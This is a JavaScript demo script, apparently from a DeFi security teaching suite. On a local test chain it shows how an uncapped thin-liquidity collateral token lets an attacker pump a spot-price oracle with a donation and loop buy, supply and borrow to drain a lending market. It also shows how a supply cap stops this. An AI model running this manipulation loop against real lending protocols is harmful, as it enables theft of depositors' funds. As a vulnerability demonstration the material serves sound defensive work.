// Attack #2: no cap on a thin token. THIN has 1.3M dollars of liquidity on our own pool, and our
// market prices it from that pool. A donation pumps the price; a loop (buy, supply, borrow) does the rest.
//   node demos/02-cap.mjs           no supply cap: the collateral backs about 120M of borrows
//   node demos/02-cap.mjs --fixed   supply cap of 500,000 THIN: the loop reverts at the cap
import { startChain, stopChains, roles, abis, units, fmt, usd } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "cap-fixed" : "cap", fixed ? "No cap on a thin token, fixed" : "No cap on a thin token");
const C = await startChain();
const A = roles.attacker;

const usdc = await C.deploy("token", ["Test USDC", "tUSDC", 18]);
const thin = await C.deploy("token", ["Thin Token", "THIN", 18]);
const amm = await C.deploy("amm", [thin, usdc]);
const oracle = await C.deploy("spot", [amm]);
// --fixed only picks which market contract is deployed (and its cap).
const market = fixed ? await C.deploy("capped", [thin, usdc, oracle, units(500_000)]) : await C.deploy("market", [thin, usdc, oracle]);
const mabi = fixed ? abis.capped : abis.market;

await C.fund(usdc, roles.deployer, units(650_000), amm);
await C.fund(thin, roles.deployer, units(650_000), amm);
await C.send(roles.deployer, amm, abis.amm, "addLiquidity", [units(650_000), units(650_000)]);
await C.fund(usdc, roles.lender, units(120_000_000), market);
await C.send(roles.lender, market, mabi, "deposit", [units(120_000_000)]);

const liq = await C.read(amm, abis.amm, "reserveQuote") + (await C.read(amm, abis.amm, "reserveBase")) * (await C.read(amm, abis.amm, "spotPrice")) / 10n ** 18n;
t.say(`THIN pool liquidity ${usd(liq, 0)} · THIN ${usd(await C.read(oracle, abis.spot, "price"))}`);
t.say(`market lenders deposited ${fmt(await C.balanceOf(usdc, market))} tUSDC`);
if (fixed) t.note(`supply cap: ${fmt(await C.read(market, mabi, "supplyCap"))} THIN`);

// The attacker starts with 1,000,000 tUSDC. Step one: donate 650,000 straight to the pool.
await C.fund(usdc, A, units(1_000_000));
await C.send(A, usdc, abis.token, "approve", [amm, 2n ** 255n]);
await C.send(A, thin, abis.token, "approve", [market, 2n ** 255n]);
t.cmd(`attacker donates 650,000 tUSDC to the pool · pool.sync()`);
await C.send(A, usdc, abis.token, "transfer", [amm, units(650_000)]);
await C.send(A, amm, abis.amm, "sync");
t.warn(`  THIN ${usd(await C.read(oracle, abis.spot, "price"))}`);

t.cmd(`loop: buy THIN → supply → borrow max`);
let stop = null;
for (let i = 1; i <= 10; i++) {
  const cash = await C.balanceOf(usdc, A.address);
  if (cash > 0n) await C.send(A, amm, abis.amm, "swap", [usdc, cash, A.address]);
  const bag = await C.balanceOf(thin, A.address);
  const s = await C.attempt(A, market, mabi, "supply", [bag]);
  if (!s.ok) { stop = `loop ${i}: supply ${fmt(bag)} THIN ✗ reverted: ${s.name}`; break; }
  const room = await C.read(market, mabi, "maxBorrow", [A.address]);
  const left = await C.balanceOf(usdc, market);
  const take = room < left ? room : left;
  await C.send(A, market, mabi, "borrow", [take]);
  const debt = await C.read(market, mabi, "debt", [A.address]);
  t.say(`  loop ${i} · THIN ${usd(await C.read(oracle, abis.spot, "price"))} · collateral ${fmt(await C.read(market, mabi, "collateralOf", [A.address]))} · borrowed ${fmt(debt)}`);
  if (take === left) break;
}
if (stop) t.ok(`  ${stop}`);

const debt = await C.read(market, mabi, "debt", [A.address]);
const coll = await C.read(market, mabi, "collateralOf", [A.address]);
const sale = coll > 0n ? await C.read(amm, abis.amm, "getAmountOut", [thin, coll]) : 0n;
t.note(`selling all ${fmt(coll)} THIN collateral into the pool would raise ${fmt(sale)} tUSDC`);
t.big(stop ? `CAP ${fmt(await C.read(market, mabi, "supplyCap"))} THIN · LOOP REVERTED · BORROWED ${fmt(debt)}`
  : `${usd(liq, 0)} OF LIQUIDITY · ${fmt(debt)} BORROWED`);
t.note(`market cash left: ${fmt(await C.balanceOf(usdc, market))} tUSDC`);
t.save(); stopChains(); process.exit(0);
